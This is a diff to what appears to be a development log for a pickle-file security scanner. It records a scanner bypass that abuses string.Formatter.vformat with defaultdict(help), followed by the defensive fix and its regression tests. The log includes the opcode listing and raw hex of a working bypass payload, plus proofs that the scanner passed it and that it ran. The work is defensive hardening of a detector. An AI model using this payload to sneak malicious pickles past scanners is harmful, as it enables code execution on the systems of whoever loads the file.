@@ -14322,3 +14322,213 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3741 passed, 1022 skipped, 21 warnings in 49.54s`.
+
+## Turn 237 - Bypass via `string.Formatter.vformat` kwargs lookup
+
+Found another scanner-clean RCE-capable mapping-dispatch bypass, this time
+through `string.Formatter.vformat`. Turn 236 models the builtin
+`str.format_map(format_string, mapping)` path, but the higher-level
+`string.Formatter.vformat(self, format_string, args, kwargs)` also resolves
+named fields through `kwargs[key]`. The payload constructs
+`collections.defaultdict(builtins.help)`, then invokes
+`Formatter.vformat(formatter, "{x}", None, mapping)`. Because `{x}` is a named
+field, `Formatter.get_value()` performs `kwargs["x"]`; the missing key calls
+the `defaultdict` factory with no arguments. `builtins.help()` then enters
+`_sitebuiltins._Helper.__call__`, which imports `pydoc`. A shadow `pydoc.py` at
+the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL string Formatter
+EMPTY_TUPLE
+REDUCE              # construct string.Formatter()
+MEMOIZE
+POP
+STACK_GLOBAL collections defaultdict
+STACK_GLOBAL builtins help
+TUPLE1
+REDUCE              # construct defaultdict(help)
+MEMOIZE
+POP
+STACK_GLOBAL string Formatter.vformat
+MARK
+BINGET 0
+SHORT_BINUNICODE "{x}"
+NONE
+BINGET 1
+TUPLE
+REDUCE              # Formatter.vformat(formatter, "{x}", None, mapping)
+STOP
+```
+
+Raw payload:
+
+```text
+80048c06737472696e678c09466f726d617474657293295294308c0b636f6c6c656374696f6e738c0b64656661756c7464696374938c086275696c74696e738c0468656c7093855294308c06737472696e678c11466f726d61747465722e76666f726d6174932868008c037b787d4e680174522e
+```
+
+Scanner proof:
+
+```text
+payload_len 116
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'string', 'name': 'Formatter',
+   'import_reference': 'string.Formatter', 'is_dangerous': False},
+  {'module': 'collections', 'name': 'defaultdict',
+   'import_reference': 'collections.defaultdict', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help', 'is_dangerous': False},
+  {'module': 'string', 'name': 'Formatter.vformat',
+   'import_reference': 'string.Formatter.vformat', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': 'string', 'name': 'Formatter',
+   'opcode_position': 23, 'positional_arg_count': 0},
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 71, 'positional_arg_count': 1},
+  {'module': 'string', 'name': 'Formatter.vformat',
+   'opcode_position': 114, 'positional_arg_count': 4},
+)
+call_graph None
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and provided a minimal
+`help` function returning `"factory-value"`.
+
+Why it bypasses:
+
+- Native policy marks `string.Formatter.get_field` as dangerous, but
+  `string.Formatter.vformat` is not a policy hit.
+- The Python call graph sees `Formatter.vformat -> Formatter._vformat ->
+  Formatter.get_field -> Formatter.get_value`, but this is not itself an RCE
+  sink because the dangerous behavior depends on the attacker-controlled
+  `kwargs` mapping object.
+- The native stack model already remembers `defaultdict(default_factory)`, but
+  only exposes hidden factory calls for `operator.getitem(defaultdict, key)` and
+  `str.format_map(..., defaultdict)`.
+- `Formatter.vformat(formatter, "{x}", None, defaultdict(help))` is recorded as
+  a normal four-argument callable invocation; it does not emit the hidden
+  zero-argument `builtins.help` factory invocation.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Extend native mapping-dispatch modeling to cover
+  `string.Formatter.vformat(self, format_string, args, kwargs)`.
+- For the current tracked source, if argument 4 is
+  `StackValue::DefaultDict { default_factory }`, emit a zero-argument
+  invocation of the factory.
+- Keep the check finite and stack-local. It can reuse the same helper added for
+  Turn 236, and it should require a string-like `format_string` plus exactly
+  four visible positional arguments.
+- Consider `Formatter._vformat` separately; it exposes the same lookup with
+  extra recursion-state arguments, but `vformat` is the compact public entry.
+
+Performance note:
+
+- Payload size is 116 bytes.
+- Warm scan median over 100 runs was `0.000065s` with max `0.000078s`.
+- A fix only needs to inspect already-extracted reducer arguments for the
+  single callable `string.Formatter.vformat`.
+
+## Turn 238 - Defense for `Formatter.vformat` default-factory kwargs lookup
+
+Implemented the source-level block for Turn 237 by extending native
+mapping-dispatch modeling to cover `string.Formatter.vformat`. The scanner now
+treats `Formatter.vformat(self, format_string, args, kwargs)` as a finite
+dispatcher that can invoke a tracked `collections.defaultdict` factory through
+named-field `kwargs[key]` lookup.
+
+Fix details:
+
+- Generalized the existing protocol-dispatch switch so it can dispatch on both
+  module and name instead of only `builtins`.
+- Added `string.Formatter.vformat` handling next to the existing
+  `builtins.format`, `builtins.str.format`, and `builtins.str.format_map`
+  helpers.
+- The new path requires exactly four visible positional arguments, a
+  string-like second argument, and a fourth argument tracked as
+  `StackValue::DefaultDict { default_factory }`.
+- When that shape is present, native metadata emits a synthetic zero-argument
+  invocation of the default factory.
+- Reused the Turn 236 zero-argument invocation helper; no package-specific
+  dangerous-global policy entry was added for `Formatter.vformat`.
+
+Regression coverage:
+
+- `test_scan_bytes_blocks_formatter_vformat_defaultdict_factory_rce` verifies
+  constructing `Formatter()` and `defaultdict(help)` remains clean.
+- The same test verifies
+  `Formatter.vformat(formatter, "{x}", None, defaultdict(help))` is malicious,
+  records a zero-argument `builtins.help` invocation, and executes the payload
+  in a child interpreter with a shadow `pydoc.py`.
+
+Post-fix proof:
+
+```text
+payload_len 116
+scan malicious complete findings 1
+callable_invocations (
+  {'module': 'string', 'name': 'Formatter',
+   'opcode_position': 23, 'positional_arg_count': 0},
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 71, 'positional_arg_count': 1},
+  {'module': 'string', 'name': 'Formatter.vformat',
+   'opcode_position': 114, 'positional_arg_count': 4},
+  {'module': 'builtins', 'name': 'help',
+   'opcode_position': 114, 'positional_arg_count': 0},
+)
+dangerous (('_sitebuiltins', '_Helper.__call__', 'builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+warm_median 0.000150
+warm_max 0.000158
+```
+
+Performance note:
+
+- The new check is stack-local and only inspects already-extracted
+  `string.Formatter.vformat` reducer arguments.
+- Warm scan median for the fixed 116-byte payload was `0.000150s` over 100
+  runs.
+
+Validation:
+
+- Rust formatting: `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `Formatter.vformat` regression: `1 passed in 0.34s`.
+- Focused import/call-graph regression file: `27 passed in 1.06s`.
+- Focused call-graph suite: `65 passed in 2.91s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.48s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3742 passed, 1022 skipped, 21 warnings in 56.26s`.
